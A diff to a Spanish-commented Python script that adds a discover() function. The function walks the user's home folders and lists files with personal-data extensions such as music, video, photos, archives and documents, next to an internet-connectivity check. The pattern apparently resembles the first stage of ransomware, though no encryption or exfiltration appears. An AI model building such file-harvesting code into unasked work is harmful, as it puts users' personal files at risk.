@@ -10,7 +10,8 @@ home = os.environ['HOME']
 carpetas = os.listdir(home)
 	# Eliminar las carpetas que empiecen con .
 carpetas = [x for x in carpetas if not x.startswith('.')]
-print(carpetas)
+
+extensiones = ['.mp3','.wav','.m4a','.mp4','.avi','.jpg','jpeg','.zip','.rar','.dat','pdf','.txt']
 
 def check_internet():
 		# crear el socket (conector)
@@ -26,6 +27,20 @@ def check_internet():
 	except:
 		exit()
 
+
+def discover():
+	lista_archivos = open('lista_archivos', 'w+')
+
+	for carpeta in carpetas:
+			# creamos ruta absoluta
+		ruta = home+'/'+carpeta
+
+		for extension in extensiones:
+			for rutabs, directorio, archivo in os.walk(ruta): # con os.walk construimos un arbol de directorios para explorar cada uno de los archivos
+				for file in archivo:
+					if file.endswith(extension):
+						lista_archivos.write(os.path.join(rutabs, file)+'\n')
+	lista_archivos.close()
 
 
 
